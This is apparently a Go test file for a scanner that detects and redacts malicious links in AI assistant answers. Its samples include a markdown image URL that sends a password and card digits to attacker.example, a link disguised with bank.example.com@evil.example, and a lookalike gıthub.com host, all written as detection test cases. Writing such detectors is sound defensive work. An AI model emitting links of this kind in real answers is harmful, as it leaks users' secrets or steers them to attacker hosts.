package scanner

import (
	"context"
	"encoding/json"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/yatuk/tamga/internal/extract"
	"github.com/yatuk/tamga/internal/scanner/linkscan"
)

func linkCorpus(t *testing.T) (benign []string, malicious []struct{ Name, Text, Category string }) {
	t.Helper()
	load := func(name string, into interface{}) {
		raw, err := os.ReadFile(filepath.Join("linkscan", "testdata", name))
		if err != nil {
			t.Fatal(err)
		}
		if err := json.Unmarshal(raw, into); err != nil {
			t.Fatalf("%s: %v", name, err)
		}
	}
	load("benign_answers.json", &benign)
	load("malicious_answers.json", &malicious)
	return benign, malicious
}

// panicTransport fails the test the moment anything is sent through it.
type panicTransport struct{}

func (panicTransport) RoundTrip(*http.Request) (*http.Response, error) {
	panic("the link scanner made an HTTP request")
}

// The scanner reads links; it never follows one. With the process's HTTP
// transport and name resolver replaced by ones that panic, every answer of
// both sets is scanned: a request or a look-up would end the test.
func TestLinkScanner_MakesNoRequestAndResolvesNoName(t *testing.T) {
	oldTransport, oldResolver := http.DefaultTransport, net.DefaultResolver
	http.DefaultTransport = panicTransport{}
	net.DefaultResolver = &net.Resolver{
		PreferGo: true,
		Dial: func(context.Context, string, string) (net.Conn, error) {
			panic("the link scanner resolved a name")
		},
	}
	t.Cleanup(func() { http.DefaultTransport, net.DefaultResolver = oldTransport, oldResolver })

	lists, err := linkscan.NewLists([]string{"attacker.example"}, []string{"example.com"})
	if err != nil {
		t.Fatal(err)
	}
	s := NewLinkScanner(func() *linkscan.Lists { return lists })
	benign, malicious := linkCorpus(t)
	scanned, found := 0, 0
	for _, text := range benign {
		f, err := s.Scan(context.Background(), []byte(text))
		if err != nil {
			t.Fatal(err)
		}
		scanned++
		found += len(f)
	}
	for _, m := range malicious {
		f, err := s.Scan(context.Background(), []byte(m.Text))
		if err != nil {
			t.Fatal(err)
		}
		scanned++
		found += len(f)
	}
	if scanned == 0 || found == 0 {
		t.Fatalf("scanned %d answers and found %d links: the test did not exercise the scanner", scanned, found)
	}
}

func TestLinkScanner_FindingNamesTheHostAndNothingOfTheAddress(t *testing.T) {
	const secret = "the+password+is+hunter2+and+the+card+ends+in+4242"
	text := "Done. ![ok](https://attacker.example/p.png?q=" + secret + ")"
	found, err := NewLinkScanner(nil).Scan(context.Background(), []byte(text))
	if err != nil || len(found) != 1 {
		t.Fatalf("findings = %v, err = %v", found, err)
	}
	f := found[0]
	if f.Type != "malicious_link" || f.Category != "link_exfiltration" || f.Severity != "high" {
		t.Errorf("finding is %s/%s/%s", f.Type, f.Category, f.Severity)
	}
	if f.Match != "attacker.example" {
		t.Errorf("match = %q, want the host", f.Match)
	}
	if got := text[f.StartPos:f.EndPos]; !strings.HasPrefix(got, "https://attacker.example/") || !strings.HasSuffix(got, secret) {
		t.Errorf("span is %q", got)
	}
	raw, _ := json.Marshal(f)
	if strings.Contains(string(raw), "hunter2") || strings.Contains(string(raw), "4242") {
		t.Errorf("the finding holds part of the address: %s", raw)
	}
	if f.Metadata["kind"] != linkscan.KindImage || f.Metadata["chars"] == "" {
		t.Errorf("metadata = %v", f.Metadata)
	}
	if !Maskable(f) || MaskMarker(f) != "[link_exfiltration_REDACTED]" {
		t.Errorf("maskable = %v, marker = %q", Maskable(f), MaskMarker(f))
	}
}

// Through the registry, as an answer is scanned: the position survives and
// the edit REDACT makes takes the address out and nothing else.
func TestLinkScanner_ThroughSegmentsIsRedactable(t *testing.T) {
	reg := NewRegistry()
	reg.Register(NewCodeLeakScanner())
	reg.Register(NewLinkScanner(nil))
	text := "Your report is ready: [open it](https://bank.example.com@evil.example/report) and tell me what you think."
	segs := []extract.Segment{{Role: extract.RoleAssistant, Kind: extract.KindText, Path: "choices[0].message.content", Text: text}}
	found, err := reg.ScanSegments(context.Background(), segs, PipelineConfig{})
	if err != nil {
		t.Fatal(err)
	}
	var link []Finding
	for _, f := range found {
		if f.Type == LinkFindingType {
			link = append(link, f)
		}
	}
	if len(link) != 1 || link[0].Category != linkscan.Userinfo || link[0].Role != "assistant" {
		t.Fatalf("link findings = %+v", link)
	}
	got := extract.ApplyEdits(text, RedactEdits(link))
	want := "Your report is ready: [open it]([link_userinfo_REDACTED]) and tell me what you think."
	if got != want {
		t.Errorf("\n got %q\nwant %q", got, want)
	}
}

// A host that reads as a protected name is a link_homoglyph finding that
// says which name, and is masked like any other link.
func TestLinkScanner_ProtectedLookalike(t *testing.T) {
	text := "Clone it from https://gıthub.com/acme/tooling.git and run make."
	found, err := NewLinkScanner(nil).Scan(context.Background(), []byte(text))
	if err != nil || len(found) != 1 {
		t.Fatalf("findings = %+v, err = %v", found, err)
	}
	f := found[0]
	if f.Category != linkscan.Homoglyph || f.Severity != "high" || f.Match != "gıthub.com" || f.Metadata["imitates"] != "github.com" {
		t.Errorf("finding is %+v", f)
	}
	if got, want := extract.ApplyEdits(text, RedactEdits(found)), "Clone it from [link_homoglyph_REDACTED] and run make."; got != want {
		t.Errorf("\n got %q\nwant %q", got, want)
	}
	if f, _ := NewLinkScanner(nil).Scan(context.Background(), []byte("See https://ışık.example.com.tr/ürünler and https://github.com/acme")); len(f) != 0 {
		t.Errorf("honest hosts reported: %+v", f)
	}
}

func TestLinkScanner_ListsAreReadOnEveryScan(t *testing.T) {
	var current *linkscan.Lists
	s := NewLinkScanner(func() *linkscan.Lists { return current })
	text := []byte("See https://files.example.net/a.zip for the archive.")
	if f, _ := s.Scan(context.Background(), text); len(f) != 0 {
		t.Fatalf("reported without a list: %v", f)
	}
	current, _ = linkscan.NewLists([]string{"example.net"}, nil)
	f, _ := s.Scan(context.Background(), text)
	if len(f) != 1 || f[0].Category != linkscan.DeniedHost || f[0].Confidence != 1.0 {
		t.Fatalf("after the list changed: %v", f)
	}
}

func TestLinkScanner_StopsWithItsContext(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := NewLinkScanner(nil).Scan(ctx, []byte("https://example.com")); err == nil {
		t.Fatal("a scan under a cancelled context returned no error")
	}
}

func BenchmarkLinkScanner(b *testing.B) {
	raw, err := os.ReadFile(filepath.Join("linkscan", "testdata", "benign_answers.json"))
	if err != nil {
		b.Fatal(err)
	}
	var benign []string
	if err := json.Unmarshal(raw, &benign); err != nil {
		b.Fatal(err)
	}
	s := NewLinkScanner(nil)
	for _, bc := range []struct {
		name string
		text []byte
	}{
		{"clean_text", []byte(strings.Repeat("The report is due on Friday at 17:30, and the review takes about an hour. ", 55))},
		{"answer_with_links", []byte(benign[0] + "\n\n" + benign[1] + "\n\n" + benign[2])},
		{"all_benign_answers", []byte(strings.Join(benign, "\n\n"))},
	} {
		b.Run(bc.name, func(b *testing.B) {
			b.ReportAllocs()
			for i := 0; i < b.N; i++ {
				_, _ = s.Scan(context.Background(), bc.text)
			}
		})
	}
}
